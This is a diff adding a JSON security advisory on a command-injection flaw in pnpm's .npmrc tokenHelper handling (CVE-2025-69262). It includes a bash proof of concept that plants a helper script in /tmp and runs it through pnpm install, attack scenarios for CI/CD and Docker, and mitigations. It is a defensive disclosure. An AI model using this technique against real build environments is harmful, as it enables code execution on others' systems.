@@ -1,0 +1,50 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-01-07T18:51:09Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "pnpm"
+  },
+  "Advisory": {
+    "DatabaseId": 330990,
+    "Id": "GSA_kwCzR0hTQS0ycGh2LWo2OHYtd3dxeM4ABQzu",
+    "GhsaId": "GHSA-2phv-j68v-wwqx",
+    "References": [
+      {
+        "Url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-2phv-j68v-wwqx"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-2phv-j68v-wwqx"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-2phv-j68v-wwqx"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-69262"
+      }
+    ],
+    "Description": "## Summary\n\nA command injection vulnerability exists in pnpm when using environment variable substitution in `.npmrc` configuration files with `tokenHelper` settings. An attacker who can control environment variables during pnpm operations could achieve remote code execution (RCE) in build environments.\n\n## Affected Components\n\n- **Package**: pnpm\n- **Versions**: All versions using `@pnpm/config.env-replace` and `loadToken` functionality\n- **File**: `pnpm/network/auth-header/src/getAuthHeadersFromConfig.ts` - `loadToken()` function\n- **File**: `pnpm/config/config/src/readLocalConfig.ts` - `.npmrc` environment variable substitution\n\n## Technical Details\n\n### Vulnerability Chain\n\n1. **Environment Variable Substitution**\n   - `.npmrc` supports `${VAR}` syntax\n   - Substitution occurs in `readLocalConfig()`\n\n2. **loadToken Execution**\n   - Uses `spawnSync(helperPath, { shell: true })`\n   - Only validates absolute path existence\n\n3. **Attack Flow**\n```\n.npmrc: registry.npmjs.org/:tokenHelper=${HELPER_PATH}\n   ↓\nenvReplace() → /tmp/evil-helper.sh\n   ↓\nloadToken() → spawnSync(..., { shell: true })\n   ↓\nRCE achieved\n```\n\n### Code Evidence\n\n**`pnpm/config/config/src/readLocalConfig.ts:17-18`**\n```typescript\nkey = envReplace(key, process.env)\nini[key] = parseField(types, envReplace(val, process.env), key)\n```\n\n**`pnpm/network/auth-header/src/getAuthHeadersFromConfig.ts:60-71`**\n```typescript\nexport function loadToken(helperPath: string, settingName: string): string {\n  if (!path.isAbsolute(helperPath) || !fs.existsSync(helperPath)) {\n    throw new PnpmError('BAD_TOKEN_HELPER_PATH', ...)\n  }\n  const spawnResult = spawnSync(helperPath, { shell: true })\n  // ...\n}\n```\n\n## Proof of Concept\n\n### Prerequisites\n- Private npm registry access\n- Control over environment variables\n- Ability to place scripts in filesystem\n\n### PoC Steps\n\n```bash\n# 1. Create malicious helper script\ncat \u003e /tmp/evil-helper.sh \u003c\u003c 'SCRIPT'\n#!/bin/bash\necho \"RCE SUCCESS!\" \u003e /tmp/rce-log.txt\necho \"TOKEN_12345\"\nSCRIPT\nchmod +x /tmp/evil-helper.sh\n\n# 2. Create .npmrc with environment variable\ncat \u003e .npmrc \u003c\u003c 'EOF'\nregistry=https://registry.npmjs.org/\nregistry.npmjs.org/:tokenHelper=${HELPER_PATH}\nEOF\n\n# 3. Set environment variable (attacker controlled)\nexport HELPER_PATH=/tmp/evil-helper.sh\n\n# 4. Trigger pnpm install\npnpm install  # RCE occurs during auth\n\n# 5. Verify attack\ncat /tmp/rce-log.txt\n```\n\n### PoC Results\n```\n==\u003e Attack successful\n==\u003e File created: /tmp/rce-log.txt\n==\u003e Arbitrary code execution confirmed\n```\n\n## Impact\n\n### Severity\n- **CVSS Score**: 7.6 (High)\n- **CVSS Vector**: cvss:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H\n\n### Affected Environments\n\n**High Risk:**\n- CI/CD pipelines (GitHub Actions, GitLab CI)\n- Docker build environments\n- Kubernetes deployments\n- Private registry users\n\n**Low Risk:**\n- Public registry only\n- Production runtime (no pnpm execution)\n- Static sites\n\n### Attack Scenarios\n\n**Scenario 1: CI/CD Supply Chain**\n```\nRepository → Build Trigger → pnpm install → RCE → Production Deploy\n```\n\n**Scenario 2: Docker Build**\n```dockerfile\nFROM node:20\nARG HELPER_PATH=/tmp/evil\nCOPY .npmrc .\nRUN pnpm install  # RCE\n```\n\n**Scenario 3: Kubernetes**\n```\nSecret Control → Env Variable → .npmrc Substitution → RCE\n```\n\n## Mitigation\n\n### Temporary Workarounds\n\n**Disable tokenHelper:**\n```ini\n# .npmrc\n# registry.npmjs.org/:tokenHelper=${HELPER_PATH}\n```\n\n**Use direct tokens:**\n```ini\n//registry.npmjs.org/:_authToken=YOUR_TOKEN\n```\n\n**Audit environment variables:**\n- Review CI/CD env vars\n- Restrict .npmrc changes\n- Monitor build logs\n\n### Recommended Fixes\n\n1. Remove `shell: true` from loadToken\n2. Implement helper path allowlist\n3. Validate substituted paths\n4. Consider sandboxing\n\n## Disclosure\n\n- **Discovery**: 2025-11-02\n- **PoC**: 2025-11-02\n- **Report**: [Pending disclosure decision]\n\n## References\n\n- Repository: https://github.com/pnpm/pnpm\n- Affected: `@pnpm/config.env-replace@^3.0.2`\n- Similar: CVE-2024-53866, CVE-2023-37478\n\n## Credit\n\nReported by: Jiyong Yang\nContact: sy2n0@naver.com",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-01-07T18:51:07Z",
+    "Severity": "HIGH",
+    "Summary": "pnpm vulnerable to Command Injection via environment variable substitution",
+    "UpdatedAt": "2026-01-07T22:03:45Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.6,
+      "VectorString": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "10.27.0"
+      },
+      "VulnerableVersionRange": "\u003e= 6.25.0, \u003c 10.27.0"
+    }
+  ]
+}
